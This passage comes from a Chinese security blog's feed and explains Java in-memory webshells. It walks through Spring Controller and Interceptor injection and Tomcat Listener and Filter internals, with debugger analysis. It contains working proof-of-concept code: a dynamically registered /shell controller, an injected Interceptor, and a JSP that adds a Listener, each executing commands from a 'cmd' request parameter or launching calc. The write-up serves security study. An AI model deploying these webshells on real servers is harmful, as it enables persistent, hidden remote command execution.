+<th><code>java // 1. 在当前上下文环境中注册一个名为 dynamicController 的 Webshell controller 实例 bean context.getBeanFactory().registerSingleton(&quot;dynamicController&quot;, Class.forName(&quot;me.landgrey.SSOLogin&quot;).newInstance()); // 2. 从当前上下文环境中获得 DefaultAnnotationHandlerMapping 的实例 bean org.springframework.web.servlet.mvc.annotation.DefaultAnnotationHandlerMapping  dh = context.getBean(org.springframework.web.servlet.mvc.annotation.DefaultAnnotationHandlerMapping.class); // 3. 反射获得 registerHandler Method java.lang.reflect.Method m1 = org.springframework.web.servlet.handler.AbstractUrlHandlerMapping.class.getDeclaredMethod(&quot;registerHandler&quot;, String.class, Object.class); m1.setAccessible(true); // 4. 将 dynamicController 和 URL 注册到 handlerMap 中 m1.invoke(dh, &quot;/favicon&quot;, &quot;dynamicController&quot;); </code></th>
+</tr>
+</thead>
+</table>
+<h3 id="font-stylecolorrgb85-85-85detecthandlermethodsfont"><font style="color:rgb(85, 85, 85);">detectHandlerMethods</font></h3>
+<p><font style="color:rgb(85, 85, 85);">参考上面的 HandlerMapping 接口继承关系图，针对使用 RequestMappingHandlerMapping 映射器的应用，可以找到它继承的顶层类org.springframework.web.servlet.handler.AbstractHandlerMethodMapping<br />
+</font><font style="color:rgb(85, 85, 85);">在其detectHandlerMethods() 方法中</font></p>
+<table>
+<thead>
+<tr>
+<th><code>java protected void detectHandlerMethods(Object handler) {     Class&lt;?&gt; handlerType = handler instanceof String ? this.getApplicationContext().getType((String)handler) : handler.getClass();     final Class&lt;?&gt; userType = ClassUtils.getUserClass(handlerType);     Set&lt;Method&gt; methods = HandlerMethodSelector.selectMethods(userType, new MethodFilter() {         public boolean matches(Method method) {             return AbstractHandlerMethodMapping.this.getMappingForMethod(method, userType) != null;         }     });     Iterator var6 = methods.iterator();     while(var6.hasNext()) {         Method method = (Method)var6.next();         T mapping = this.getMappingForMethod(method, userType);         this.registerHandlerMethod(handler, method, mapping);     } } </code></th>
+</tr>
+</thead>
+</table>
+<p><font style="color:rgb(85, 85, 85);">该方法仅接受handler参数，同样可以在 this.getApplicationContext() 获得的上下文环境中寻找名字为 handler 参数值的 bean, 并注册 controller 的实例 bean</font></p>
+<table>
+<thead>
+<tr>
+<th><code>java context.getBeanFactory().registerSingleton(&quot;dynamicController&quot;, Class.forName(&quot;恶意Controller&quot;).newInstance()); org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping requestMappingHandlerMapping = context.getBean(org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping.class); java.lang.reflect.Method m1 = org.springframework.web.servlet.handler.AbstractHandlerMethodMapping.class.getDeclaredMethod(&quot;detectHandlerMethods&quot;, Object.class); m1.setAccessible(true); m1.invoke(requestMappingHandlerMapping, &quot;dynamicController&quot;); </code></th>
+</tr>
+</thead>
+</table>
+<h2 id="poc">POC</h2>
+<p>我这里就用springboot 2.5.6版本进行复现了</p>
+<p>思路还是很简单的：</p>
+<p>先获取当前的上下文，然后获取RequestMappingHandlerMapping 的实例，然后在反射获取我们写好的恶意类的恶意方法，然后获取并且设置我们想要把恶意类映射到的路径，和请求方法，设置到RequestMappingInfo类中，然后在调用RequestMappingHandlerMapping中的registerMapping方法，完成动态注入</p>
+<pre><code class="language-java">package org.example.spring.Controller;
+
+import org.springframework.web.bind.annotation.RequestMapping;
+import org.springframework.web.bind.annotation.ResponseBody;
+import org.springframework.web.bind.annotation.RestController;
+import org.springframework.web.context.WebApplicationContext;
+import org.springframework.web.context.request.RequestContextHolder;
+import org.springframework.web.context.request.ServletRequestAttributes;
+import org.springframework.web.servlet.mvc.condition.PatternsRequestCondition;
+import org.springframework.web.servlet.mvc.condition.RequestMethodsRequestCondition;
+import org.springframework.web.servlet.mvc.method.RequestMappingInfo;
+import org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping;
+
+import javax.servlet.http.HttpServletRequest;
+import java.io.IOException;
+import java.lang.reflect.Method;
+
+@RestController
+public class shell_controller {
+
+    @RequestMapping(&quot;/exec&quot;)
+    public void Spring_Controller() throws ClassNotFoundException, InstantiationException, IllegalAccessException, NoSuchMethodException {
+
+        //获取当前上下文环境
+        WebApplicationContext context = (WebApplicationContext) RequestContextHolder.currentRequestAttributes().getAttribute(&quot;org.springframework.web.servlet.DispatcherServlet.CONTEXT&quot;, 0);
+
+        //手动注册Controller
+        // 1. 从当前上下文环境中获得 RequestMappingHandlerMapping 的实例 bean
+        RequestMappingHandlerMapping r = context.getBean(RequestMappingHandlerMapping.class);
+        // 2. 通过反射获得自定义 controller 中唯一的 Method 对象
+        Method method = Shell.class.getDeclaredMethod(&quot;shell&quot;);
+        // 3. 定义访问 controller 的 URL 地址
+        PatternsRequestCondition url = new PatternsRequestCondition(&quot;/shell&quot;);
+        // 4. 定义允许访问 controller 的 HTTP 方法（GET/POST）
+        RequestMethodsRequestCondition ms = new RequestMethodsRequestCondition();
+        // 5. 在内存中动态注册 controller
+        RequestMappingInfo info = new RequestMappingInfo(url, ms, null, null, null, null, null);
+        r.registerMapping(info, new Shell(), method);
+
+    }
+
+    @ResponseBody
+    public class Shell{
+
+        public Shell(){}
+
+        public void shell() throws IOException {
+            //获取request
+            HttpServletRequest request = ((ServletRequestAttributes) (RequestContextHolder.currentRequestAttributes())).getRequest();
+            Runtime.getRuntime().exec(request.getParameter(&quot;cmd&quot;));
+        }
+    }
+
+}
+</code></pre>
+<p><img src="https://raw.githubusercontent.com/bloyet/tupian/main/20260911012905499_00040.png" alt="" /></p>
+<p>这里有个问题，在springboot版本大于2.6.0的时候会出现一个报错导致命令执行失败</p>
+<p>解决办法参考：<a href="https://yyjccc.github.io/2024/03/12/Spring%E5%86%85%E5%AD%98%E9%A9%AC/">Spring内存马</a></p>
+<h1 id="font-stylecolorrgb85-85-85interceptorfont"><font style="color:rgb(85, 85, 85);">Interceptor型内存马</font></h1>
+<h2 id="interceptor">什么是Interceptor</h2>
+<p>Spring MVC 的拦截器（Interceptor）与 Java Servlet 的过滤器（Filter）类似，它主要用于拦截用户的请求并做相应的处理，通常应用在权限验证、记录请求信息的日志、判断用户是否登录等功能上。在 Spring MVC 框架中定义一个拦截器需要对拦截器进行定义和配置，主要有以下 2 种方式。</p>
+<p>通过实现 HandlerInterceptor 接口或继承 HandlerInterceptor 接口的实现类（例如 HandlerInterceptorAdapter）来定义</p>
+<p>通过实现 WebRequestInterceptor 接口或继承 WebRequestInterceptor 接口的实现类来定义</p>
+<h2 id="interceptor-1">Interceptor示例</h2>
+<p>在springboot下写了：</p>
+<p>WebConfig</p>
+<pre><code class="language-java">package org.example.spring.Config;
+import org.springframework.context.annotation.Configuration;
+import org.springframework.web.servlet.config.annotation.*;
+
+@Configuration
+public class WebConfig implements WebMvcConfigurer {
+
+    @Override
+    public void addInterceptors(InterceptorRegistry registry) {
+        registry.addInterceptor(new org.example.spring.Interceptor.MyInterceptor())
+                .addPathPatterns(&quot;/**&quot;)       // 拦截所有路径
+                .excludePathPatterns(&quot;/login&quot;); // 排除登录路径
+    }
+}
+</code></pre>
+<p>TestController</p>
+<pre><code class="language-java">package org.example.spring.Controller;
+
+import org.springframework.web.bind.annotation.*;
+
+@RestController
+public class TestController {
+
+    @GetMapping(&quot;/hello&quot;)
+    public String hello() {
+        return &quot;Hello, world!&quot;;
+    }
+
+    @GetMapping(&quot;/login&quot;)
+    public String login() {
+        return &quot;Login page (not intercepted)&quot;;
+    }
+}
+</code></pre>
+<p>MyInterceptor</p>
+<pre><code class="language-java">package org.example.spring.Interceptor;
+
+import javax.servlet.http.HttpServletRequest;
+import javax.servlet.http.HttpServletResponse;
+import org.springframework.web.servlet.HandlerInterceptor;
+
+public class MyInterceptor implements HandlerInterceptor {
+
+    @Override
+    public boolean preHandle(HttpServletRequest request,
+                             HttpServletResponse response,
+                             Object handler) throws Exception {
+        System.out.println(&quot;进入拦截器：MyInterceptor -&gt; preHandle&quot;);
+        // 返回 true 继续执行，false 则终止请求链
+        return false;
+    }
+}
+</code></pre>
+<p><img src="https://raw.githubusercontent.com/bloyet/tupian/main/20260911012921781_00048.png" alt="" /></p>
+<p>效果就跟Filter差不多，当访问的路由不是login，就会进入拦截器 如果返回true就继续执行，如果返回为false就中断这次原来对应的处理方法</p>
+<p>断点下在<font style="color:rgb(85, 85, 85);">ApplicationFilterChain#internalDoFilter，可以看到和我们之前学的Tomcat很像，但与Tomcat不同的是，当调用到HttpServlet#service时，最终会调用DispatcherServlet#doDispatch进行逻辑处理，这正是Spring的逻辑处理核心类。</font></p>
+<p><img src="https://raw.githubusercontent.com/bloyet/tupian/main/20260911012924045_00049.png" alt="" /></p>
+<p>我们就直接来看核心类</p>
+<p><img src="https://raw.githubusercontent.com/bloyet/tupian/main/20260911012905522_00042.png" alt="" /></p>
+<p>跟进getHandler方法：</p>
+<p>使用增强for语句 遍历handlerMappings来获取HandlerMapping类型的对象</p>
+<pre><code class="language-java">protected HandlerExecutionChain getHandler(HttpServletRequest request) throws Exception {
+    if (this.handlerMappings != null) {
+        for(HandlerMapping mapping : this.handlerMappings) {
+            HandlerExecutionChain handler = mapping.getHandler(request);
+            if (handler != null) {
+                return handler;
+            }
+        }
+    }
+
+    return null;
+}
+</code></pre>
+<p>实际上还会调用<font style="color:rgb(85, 85, 85);">org.springframework.web.servlet.handler.AbstractHandlerMapping 类的 getHandler 方法</font></p>
+<pre><code class="language-java">public final HandlerExecutionChain getHandler(HttpServletRequest request) throws Exception {
+    Object handler = this.getHandlerInternal(request);
+    if (handler == null) {
+        handler = this.getDefaultHandler();
+    }
+
+    if (handler == null) {
+        return null;
+    } else {
+        if (handler instanceof String) {
+            String handlerName = (String)handler;
+            handler = this.obtainApplicationContext().getBean(handlerName);
+        }
+
+        if (!ServletRequestPathUtils.hasCachedPath(request)) {
+            this.initLookupPath(request);
+        }
+
+        HandlerExecutionChain executionChain = this.getHandlerExecutionChain(handler, request);
+        if (this.logger.isTraceEnabled()) {
+            this.logger.trace(&quot;Mapped to &quot; + handler);
+        } else if (this.logger.isDebugEnabled() &amp;&amp; !DispatcherType.ASYNC.equals(request.getDispatcherType())) {
+            this.logger.debug(&quot;Mapped to &quot; + executionChain.getHandler());
+        }
+
+        if (this.hasCorsConfigurationSource(handler) || CorsUtils.isPreFlightRequest(request)) {
+            CorsConfiguration config = this.getCorsConfiguration(handler, request);
+            if (this.getCorsConfigurationSource() != null) {
+                CorsConfiguration globalConfig = this.getCorsConfigurationSource().getCorsConfiguration(request);
+                config = globalConfig != null ? globalConfig.combine(config) : config;
+            }
+
+            if (config != null) {
+                config.validateAllowCredentials();
+            }
+
+            executionChain = this.getCorsHandlerExecutionChain(request, executionChain, config);
+        }
+
+        return executionChain;
+    }
+}
+</code></pre>
+<p>跟进getHandlerExecutionChain方法：</p>
+<p>通过遍历adaptedInterceptors 获取到所有的HandlerInterceptor</p>
+<pre><code class="language-java">protected HandlerExecutionChain getHandlerExecutionChain(Object handler, HttpServletRequest request) {
+    HandlerExecutionChain chain = handler instanceof HandlerExecutionChain ? (HandlerExecutionChain)handler : new HandlerExecutionChain(handler);
+
+    for(HandlerInterceptor interceptor : this.adaptedInterceptors) {
+        if (interceptor instanceof MappedInterceptor) {
+            MappedInterceptor mappedInterceptor = (MappedInterceptor)interceptor;
+            if (mappedInterceptor.matches(request)) {
+                chain.addInterceptor(mappedInterceptor.getInterceptor());
+            }
+        } else {
+            chain.addInterceptor(interceptor);
+        }
+    }
+
+    return chain;
+}
+</code></pre>
+<p>找到了我们自定义的interceptor</p>
+<p><img src="https://raw.githubusercontent.com/bloyet/tupian/main/20260911012905506_00041.png" alt="" /></p>
+<p>然后在通过chain.addInterceptor 把所有的interceptor<font style="color:rgb(85, 85, 85);">添加到HandlerExecutionChain中，然后就结束了，回到</font></p>
+<p><font style="color:rgb(85, 85, 85);">一开始的DispatcherServlet#doDispatch()中，调用mappedHandler.applyPreHandle方法</font></p>
+<p><img src="https://raw.githubusercontent.com/bloyet/tupian/main/20260911012919580_00047.png" alt="" /></p>
+<p><font style="color:rgb(85, 85, 85);">然后遍历调用Interceptor中的preHandle()拦截方法</font></p>
+<p><font style="color:rgb(85, 85, 85);"></font></p>
+<h2 id="font-stylecolorrgb85-85-85font"><font style="color:rgb(85, 85, 85);">实现思路</font></h2>
+<p><font style="color:rgb(85, 85, 85);">获取上下文</font></p>
+<p><font style="color:rgb(85, 85, 85);">实现一个恶意Interceptor类</font></p>
+<p><font style="color:rgb(85, 85, 85);">动态注册进内存</font></p>
+<p><font style="color:rgb(85, 85, 85);"></font></p>
+<h3 id="font-stylecolorrgb85-85-85font-1"><font style="color:rgb(85, 85, 85);">获取上下文</font></h3>
+<p>获取上下文和Controller思路是一样的</p>
+<p>同时，我们通过刚刚的调试可以知道，<font style="color:rgb(85, 85, 85);">Interceptor类的信息是存储在adaptedInterceptors中的，所以我们需要反射获取到这个属性并且把恶意类添加进去</font></p>
+<p><img src="https://raw.githubusercontent.com/bloyet/tupian/main/20260911012905470_00039.png" alt="" /></p>
+<p>所以我们可以通过获取上下文来 获取到这个对象（Bean）的<font style="color:rgb(85, 85, 85);">adaptedInterceptors属性</font></p>
+<p><font style="color:rgb(85, 85, 85);"></font></p>
+<h3 id="font-stylecolorrgb85-85-85interceptorfont-1"><font style="color:rgb(85, 85, 85);">实现恶意Interceptor类</font></h3>
+<p>我们需要实现HandlerInterceptor类，重写preHandle方法</p>
+<pre><code class="language-java">public class MyInterceptor implements HandlerInterceptor {
+
+    @Override
+    public boolean preHandle(HttpServletRequest request,
+                             HttpServletResponse response,
+                             Object handler) throws Exception {
+        Runtime.getRuntime().exec(&quot;calc&quot;);
+        // 返回 true 继续执行，false 则终止请求链
+        return false;
+
+    }
+}
+</code></pre>
+<h3 id="heading-2">动态注入</h3>
+<p><font style="color:rgb(85, 85, 85);">adaptedInterceptors其实是一个数组，我们直接用add方法添加我们的恶意类就行，这里要注意的是我们</font></p>
+<pre><code class="language-java">实际上获取到的是它的实现类org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping
+所以是不能直接通过他来反射获取字段
+AbstractHandlerMapping handlerMapping = (AbstractHandlerMapping) context.getBean(AbstractHandlerMapping.class);
+
+</code></pre>
+<h3 id="poc-1">POC</h3>
+<pre><code class="language-java">package org.example.spring.Controller;
+
+
+import org.springframework.stereotype.Controller;
+import org.springframework.web.bind.annotation.RequestMapping;
+import org.springframework.web.context.WebApplicationContext;
+import org.springframework.web.context.request.RequestContextHolder;
+import org.springframework.web.servlet.HandlerInterceptor;
+import org.springframework.web.servlet.handler.AbstractHandlerMapping;
+
+import javax.servlet.http.HttpServletRequest;
+import javax.servlet.http.HttpServletResponse;
+import java.lang.reflect.Field;
+import java.util.ArrayList;
+
+@Controller
+public class shellInterceptor {
+    @RequestMapping(&quot;/shell&quot;)
+    public void shell() throws Exception {
+        WebApplicationContext context = (WebApplicationContext) RequestContextHolder.currentRequestAttributes().getAttribute(&quot;org.springframework.web.servlet.DispatcherServlet.CONTEXT&quot;, 0);
+        AbstractHandlerMapping handlerMapping = (AbstractHandlerMapping) context.getBean(AbstractHandlerMapping.class);
+        System.out.println(handlerMapping.getClass().getName());
+        Field field = AbstractHandlerMapping.class.getDeclaredField(&quot;adaptedInterceptors&quot;);
+        field.setAccessible(true);
+        ArrayList list = (ArrayList) field.get(handlerMapping);
+        list.add(new shell_Interceptor());
+
+    }
+
+    public class shell_Interceptor implements HandlerInterceptor {
+
+        @Override
+        public boolean preHandle(HttpServletRequest request,
+                                 HttpServletResponse response,
+                                 Object handler) throws Exception {
+            Runtime.getRuntime().exec(&quot;calc&quot;);
+            // 返回 true 继续执行，false 则终止请求链
+            return false;
+
+
+        }
+    }
+}
+</code></pre>
+]]></description>
+    </item>
+    <item>
+      <title>Tomcat型内存马</title>
+      <link>https://bloyet.github.io/post/tomcat-xing-nei-cun-ma/</link>
+      <guid isPermaLink="true">https://bloyet.github.io/post/tomcat-xing-nei-cun-ma/</guid>
+      <pubDate>Thu, 04 Sep 2025 01:28:46 +0800</pubDate>
+      <description><![CDATA[<p>dda参考文献：</p>
+<p><a href="https://yyjccc.github.io/2024/03/06/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC/">Tomcat内存马</a></p>
+<p><a href="https://goodapple.top/archives/1355">Java安全学习——内存马 - 枫のBlog</a></p>
+<h1 id="tomcatcontext">Tomcat中的三种Context</h1>
+<p>根据Tomcat的三大件servlet、linstener、filter注入内存马，Servlet在3.0版本之后能够支持动态注册组件。而Tomcat直到7.x才支持Servlet3.0，因此通过动态添加恶意组件注入内存马的方式适合Tomcat7.x及以上</p>
+<p>先导入依赖：</p>
+<pre><code class="language-java">&lt;dependency&gt;
+&lt;groupId&gt;org.apache.tomcat&lt;/groupId&gt;
+&lt;artifactId&gt;tomcat-catalina&lt;/artifactId&gt;
+&lt;version&gt;8.5.31&lt;/version&gt;
+&lt;/dependency&gt;
+</code></pre>
+<h2 id="font-stylecolorrgb50-50-93servletcontextfont"><font style="color:rgb(50, 50, 93);">ServletContext</font></h2>
+<p>在Tomcat架构分析的时候，也提到过这个：</p>
+<p>Servlet规范中规定了一个ServletContext接口，其用来保存一个Web应用中所有Servlet的上下文信息，可以通过ServletContext来对某个Web应用的资源进行访问和操作</p>
+<p><img src="https://raw.githubusercontent.com/bloyet/tupian/main/20260911012732886_00004.png" alt="" /></p>
+<h2 id="font-stylecolorrgb50-50-93applicationcontextfont"><font style="color:rgb(50, 50, 93);">ApplicationContext</font></h2>
+<p><img src="https://raw.githubusercontent.com/bloyet/tupian/main/20260911012830354_00033.png" alt="" /></p>
+<p>使用getServletContext()方法其实是获取到了ApplicationContextFacade类，但是其实本质上还是调用了<font style="color:rgb(50, 50, 93);">ApplicationContext类中的方法</font></p>
+<p><img src="https://raw.githubusercontent.com/bloyet/tupian/main/20260911012732841_00001.png" alt="" /></p>
+<h2 id="font-stylecolorrgb50-50-93standardcontextfont"><font style="color:rgb(50, 50, 93);">StandardContext</font></h2>
+<p>它是context容器的标准实现类，包含了对容器资源的各种操作，<font style="color:rgb(50, 50, 93);">ApplicationContext本质上是调用了StandardContext</font></p>
+<p><img src="https://raw.githubusercontent.com/bloyet/tupian/main/20260911012737707_00006.png" alt="" /></p>
+<p>一张图来总结其中的关系：</p>
+<p><img src="https://raw.githubusercontent.com/bloyet/tupian/main/20260911012739773_00007.jpeg" alt="" /></p>
+<h1 id="tomcat">Tomcat内存马</h1>
+<p>Tomcat内存马大致可以分为三类，分别是Listener型、Filter型、Servlet型。可能有些朋友会发现，这不正是Java Web核心的三大组件嘛！没错，Tomcat内存马的核心原理就是动态地将恶意组件添加到正在运行的Tomcat服务器中。</p>
+<p>在这就一步一步的来分析：</p>
+<p>引入Tomcat依赖—这个我在一开始就已经引入了</p>
+<h2 id="listener">Listener型</h2>
+<p>Listener根据事件可以分为3中ServletContextListener，HttpSessionListener，ServletRequestListener</p>
+<p>很明显，ServletRequestListener类型的是最适合用来做内存马的，当我们访问任意资源时，都会触发<code>ServletRequestListener#requestInitialized()</code>方法，我们只需要在这个方法中写入恶意命令就可以达到攻击手段了</p>
+<p>例子：</p>
+<pre><code class="language-java">package Listener;
+import javax.servlet.ServletRequestEvent;
+import javax.servlet.ServletRequestListener;
+import javax.servlet.annotation.WebListener;
+import java.io.IOException;
+
+@WebListener
+public class Hello_Listener implements ServletRequestListener {
+
+
+    @Override
+    public void requestDestroyed(ServletRequestEvent sre) {
+
+    }
+
+    @Override
+    public void requestInitialized(ServletRequestEvent sre) {
+        try {
+            Runtime.getRuntime().exec(&quot;calc&quot;);
+        } catch (IOException e) {
+            e.printStackTrace();
+        } catch (NullPointerException n) {
+            n.printStackTrace();
+        }
+    }
+}
+</code></pre>
+<p>访问任意路由都会触发命令</p>
+<p><img src="https://raw.githubusercontent.com/bloyet/tupian/main/20260911012741924_00008.png" alt="" /></p>
+<p>我们刚刚只是演示了一下 Listener中的requestInitialized() 会在我们访问路由的时候自动调用，但是我们不可能可以直接去修改这个方法，那应该怎么动态的写入恶意的listener呢？</p>
+<h3 id="listener-1">Listener注册过程</h3>
+<p>断点就打在requestInitialized()方法上，我们看看在这之前都调用了什么隐藏帧，开始回溯寻找调用过程</p>
+<p><img src="https://raw.githubusercontent.com/bloyet/tupian/main/20260911012744184_00009.png" alt="" /></p>
+<p>先来看StandarContext#fireRequestInitEvent方法</p>
+<pre><code class="language-java">public boolean fireRequestInitEvent(ServletRequest request) {
+Object[] instances = this.getApplicationEventListeners();
+if (instances != null &amp;&amp; instances.length &gt; 0) {
+    ServletRequestEvent event = new ServletRequestEvent(this.getServletContext(), request);
+
+    for(int i = 0; i &lt; instances.length; ++i) {
+        if (instances[i] != null &amp;&amp; instances[i] instanceof ServletRequestListener) {
+            ServletRequestListener listener = (ServletRequestListener)instances[i];
+
+            try {
+                listener.requestInitialized(event);
+            } catch (Throwable var7) {
+                Throwable t = var7;
+                ExceptionUtils.handleThrowable(t);
+                this.getLogger().error(sm.getString(&quot;standardContext.requestListener.requestInit&quot;, new Object[]{instances[i].getClass().getName()}), t);
+                request.setAttribute(&quot;javax.servlet.error.exception&quot;, t);
+                return false;
+            }
+        }
+    }
+}
+
+return true;
+}
+</code></pre>
+<p>先是调用getApplicationEventListeners()获取到一个数组，然后遍历数组调用listener.requestInitialized(event);方法触发Litener，先步入</p>
+<p>getApplicationEventListeners()方法</p>
+<pre><code class="language-java">public Object[] getApplicationEventListeners() {
+    return applicationEventListenersList.toArray();
+}
+</code></pre>
+<p>发现信息是储存在applicationEventListenersList中的：</p>
+<p><img src="https://raw.githubusercontent.com/bloyet/tupian/main/20260911012745709_00010.png" alt="" /></p>
+<p>而且我们是可以通过StandardContext#addApplicationEventListener()方法来添加Listener</p>
+<pre><code class="language-java">public void addApplicationEventListener(Object listener) {
+this.applicationEventListenersList.add(listener);
+}
+</code></pre>
+<h3 id="listener-2">注入Listener</h3>
+<p>在往上看一帧</p>
+<p><img src="https://raw.githubusercontent.com/bloyet/tupian/main/20260911012747553_00011.png" alt="" /></p>
+<p><img src="https://raw.githubusercontent.com/bloyet/tupian/main/20260911012749085_00012.png" alt="" /></p>
+<p>发现在这执行了invoke方法 获取到了StandardContext的实例</p>
+<p>第二种方法获取：</p>
+<p>由于JSP内置了request对象，我们也可以使用同样的方式来获取</p>
+<pre><code class="language-java">&lt;%
+Field reqF = request.getClass().getDeclaredField(&quot;request&quot;);
+reqF.setAccessible(true);
+Request req = (Request) reqF.get(request);
+//这里的Request为org.apache.catalina.connector.Request
+StandardContext context = (StandardContext) req.getContext();
+%&gt;
+</code></pre>
+<p>第三种：</p>
+<pre><code class="language-java">&lt;%
+WebappClassLoaderBase webappClassLoaderBase = (WebappClassLoaderBase) Thread.currentThread().getContextClassLoader();
+StandardContext standardContext = (StandardContext) webappClassLoaderBase.getResources().getContext();
+%&gt;
+</code></pre>
+<p>这里就用第二种来进行注入：</p>
+<p>这里先使用jsp文件进行注入，后面还会说实战怎么通过反序列化来加载</p>
+<pre><code class="language-java">&lt;%@ page contentType=&quot;text/html;charset=UTF-8&quot; language=&quot;java&quot; %&gt;
+&lt;%@ page import=&quot;java.lang.reflect.Field&quot; %&gt;
+&lt;%@ page import=&quot;java.io.IOException&quot; %&gt;
+&lt;%@ page import=&quot;org.apache.catalina.core.StandardContext&quot; %&gt;
+&lt;%@ page import=&quot;org.apache.catalina.connector.Request&quot; %&gt;
+ 
+&lt;%!
+    public class Shell_Listener implements ServletRequestListener {
+ 
+        public void requestInitialized(ServletRequestEvent sre) {
+            HttpServletRequest request = (HttpServletRequest) sre.getServletRequest();
+           String cmd = request.getParameter(&quot;cmd&quot;);
+           if (cmd != null) {
+               try {
+                   Runtime.getRuntime().exec(cmd);
+               } catch (IOException e) {
+                   e.printStackTrace();
+               } catch (NullPointerException n) {
+                   n.printStackTrace();
+               }
+            }
+        }
+ 
+        public void requestDestroyed(ServletRequestEvent sre) {
+        }
+    }
+%&gt;
+&lt;%
+    Field reqF = request.getClass().getDeclaredField(&quot;request&quot;);
+    reqF.setAccessible(true);
+    Request req = (Request) reqF.get(request);
+    StandardContext context = (StandardContext) req.getContext();
+ 
+    Shell_Listener shell_Listener = new Shell_Listener();
+    context.addApplicationEventListener(shell_Listener);
+%&gt;
+</code></pre>
+<p>先访问一下jsp文件 这样就会把我们的恶意Listener注入了（访问这个jsp文件之后，会执行其中的代码，我们先是获取到了context上下文，然后把我们的恶意类添加到上下文中，然后在自动的调用我们的恶意方法）</p>
+<p><img src="https://raw.githubusercontent.com/bloyet/tupian/main/20260911012734898_00005.png" alt="" /></p>
+<h2 id="filter">Filter型</h2>
+<h3 id="filter-1">Filter调用分析</h3>
+<p>调用栈如下：注意的是 在我们给doFilter方法打上断点之后，已调试的模式去运行服务器，还需要去访问一下资源，在访问的过程中会触发Filter</p>
+<p><img src="https://raw.githubusercontent.com/bloyet/tupian/main/20260911012822901_00029.png" alt="" /></p>
+<p>还是一样先看调用栈</p>
+<p>ApplicationFilterChain#internalDoFilter</p>
+<pre><code class="language-java">private void internalDoFilter(ServletRequest request, ServletResponse response) throws IOException, ServletException {
+    if (this.pos &lt; this.n) {
+        ApplicationFilterConfig filterConfig = this.filters[this.pos++];
+
+        try {
+            Filter filter = filterConfig.getFilter();
+            if (request.isAsyncSupported() &amp;&amp; &quot;false&quot;.equalsIgnoreCase(filterConfig.getFilterDef().getAsyncSupported())) {
+                request.setAttribute(&quot;org.apache.catalina.ASYNC_SUPPORTED&quot;, Boolean.FALSE);
+            }
+
+            if (Globals.IS_SECURITY_ENABLED) {
+                ServletRequest req = request;
+                ServletResponse res = response;
+                Principal principal = ((HttpServletRequest)req).getUserPrincipal();
+                Object[] args = new Object[]{req, res, this};
+                SecurityUtil.doAsPrivilege(&quot;doFilter&quot;, filter, classType, args, principal);
+            } else {
+                filter.doFilter(request, response, this);
+            }
+
+        } catch (ServletException | RuntimeException | IOException var15) {
+            Exception e = var15;
+            throw e;
+        } catch (Throwable var16) {
+            Throwable e = var16;
+            e = ExceptionUtils.unwrapInvocationTargetException(e);
+            ExceptionUtils.handleThrowable(e);
+            throw new ServletException(sm.getString(&quot;filterChain.filter&quot;), e);
+        }
+    } else {
+        try {
+            if (ApplicationDispatcher.WRAP_SAME_OBJECT) {
+                lastServicedRequest.set(request);
+                lastServicedResponse.set(response);
+            }
+
+            if (request.isAsyncSupported() &amp;&amp; !this.servletSupportsAsync) {
+                request.setAttribute(&quot;org.apache.catalina.ASYNC_SUPPORTED&quot;, Boolean.FALSE);
+            }
+
+            if (request instanceof HttpServletRequest &amp;&amp; response instanceof HttpServletResponse &amp;&amp; Globals.IS_SECURITY_ENABLED) {
+                ServletRequest req = request;
+                ServletResponse res = response;
+                Principal principal = ((HttpServletRequest)req).getUserPrincipal();
+                Object[] args = new Object[]{req, res};
+                SecurityUtil.doAsPrivilege(&quot;service&quot;, this.servlet, classTypeUsedInService, args, principal);
+            } else {
+                this.servlet.service(request, response);
+            }
+        } catch (ServletException | RuntimeException | IOException var17) {
+            Exception e = var17;
+            throw e;
+        } catch (Throwable var18) {
+            Throwable e = var18;
+            e = ExceptionUtils.unwrapInvocationTargetException(e);
+            ExceptionUtils.handleThrowable(e);
+            throw new ServletException(sm.getString(&quot;filterChain.servlet&quot;), e);
+        } finally {
+            if (ApplicationDispatcher.WRAP_SAME_OBJECT) {
+                lastServicedRequest.set((Object)null);
+                lastServicedResponse.set((Object)null);
+            }
+
+        }
+
+    }
+}
+</code></pre>
+<p>在这里稍微了解一下filterConfig</p>
+<p>一个filterConfig对应一个Filter，用于存储Filter的上下文信息</p>
+<p><img src="https://raw.githubusercontent.com/bloyet/tupian/main/20260911012824711_00030.png" alt="" /></p>
+<p>再去看看filters是怎么来的</p>
+<p><img src="https://raw.githubusercontent.com/bloyet/tupian/main/20260911012826641_00031.png" alt="" /></p>
+<p>这里的<code>filters</code>属性是一个ApplicationFilterConfig数组。 我们直接去这个数组里怎么储存Filter的，很难找到（这里其实是有点难理解的，先跟着大佬文章看吧）我这里的初步理解是因为调用的ApplicationFilterChain所以要找到ApplicationFilterChain的Filter，我们就继续往上看调用帧</p>
+<p>StandardWrapperValve#invoke方法中</p>
+<p><img src="https://raw.githubusercontent.com/bloyet/tupian/main/20260911012821662_00028.png" alt="" /></p>
+<p>看看它是怎么来的：</p>
+<p><img src="https://raw.githubusercontent.com/bloyet/tupian/main/20260911012832868_00035.png" alt="" /></p>
+<p>步入ApplicationFilterFactory.createFilterChain方法：</p>
+<pre><code class="language-java">public static ApplicationFilterChain createFilterChain(ServletRequest request,
+            Wrapper wrapper, Servlet servlet) {
+ 
+        ...
+        // Request dispatcher in use
+        filterChain = new ApplicationFilterChain();
+ 
+        filterChain.setServlet(servlet);
+        filterChain.setServletSupportsAsync(wrapper.isAsyncSupported());
+ 
+        // Acquire the filter mappings for this Context
+        StandardContext context = (StandardContext) wrapper.getParent();
+        FilterMap filterMaps[] = context.findFilterMaps();
+ 
+        ...
+ 
+        String servletName = wrapper.getName();
+ 
+        // Add the relevant path-mapped filters to this filter chain
+        for (FilterMap filterMap : filterMaps) {
+            
+            ...
+            ApplicationFilterConfig filterConfig = (ApplicationFilterConfig)
+                    context.findFilterConfig(filterMap.getFilterName());
+            ...
+ 
+            filterChain.addFilter(filterConfig);
+        }
+ 
+        ...
+ 
+        // Return the completed filter chain
+        return filterChain;
+    }
+</code></pre>
+<p>只看其中关键代码：</p>
+<pre><code class="language-java">首先通过filterChain = new ApplicationFilterChain()创建一个空的filterChain对象
+然后通过wrapper.getParent()函数来获取StandardContext对象
+接着获取StandardContext中的FilterMaps对象，FilterMaps对象中存储的是各Filter的名称路径等信息
+最后根据Filter的名称，在StandardContext中获取FilterConfig
